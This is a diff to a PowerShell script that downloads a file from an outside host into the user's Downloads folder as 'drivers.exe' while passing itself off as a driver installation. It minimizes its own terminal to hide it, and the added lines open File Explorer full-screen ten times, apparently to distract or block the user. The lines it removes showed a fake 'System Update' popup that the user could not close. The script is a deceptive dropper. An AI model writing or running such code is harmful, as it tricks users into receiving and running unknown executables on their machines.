@@ -2,7 +2,7 @@
 $url = "https://dkm.s.gy/file"
 $out = "$env:USERPROFILE\Downloads\drivers.exe"
 
-# --- Window Management Setup ---
+# --- Anti-Interruption & Window Manipulation ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
@@ -15,14 +15,16 @@ public class WindowHelper {
 "@
 
 $hWnd = [WindowHelper]::GetForegroundWindow()
-[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize
-
-# --- Persistent Popup ---
-$wshell = New-Object -ComObject Wscript.Shell
-$popup = $wshell.Popup("Installing drivers... Please wait.", 0, "System Update", 0x1000 + 0x40) 
-# 0x1000 = Always on Top, 0x40 = No buttons (cannot be closed by user)
+[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize (Hide the terminal)
 
 Write-Host "Starting installation..." -ForegroundColor Cyan
+
+# Open File Explorer 10 times in Full Screen
+$shell = New-Object -ComObject Shell.Application
+1..10 | ForEach-Object { 
+    $exp = $shell.Explore("C:\")
+    $exp.FullScreen = $true
+}
 
 # Download the file
 Write-Host "importing...." -ForegroundColor Yellow
@@ -46,6 +48,5 @@ if (Test-Path $out) {
     Write-Warning "swerteeng kumag"
 }
 
-# Close the popup and exit
-$wshell.Popup("Installation Complete!", 2, "Done", 0x40)
+# Exit the terminal
 exit
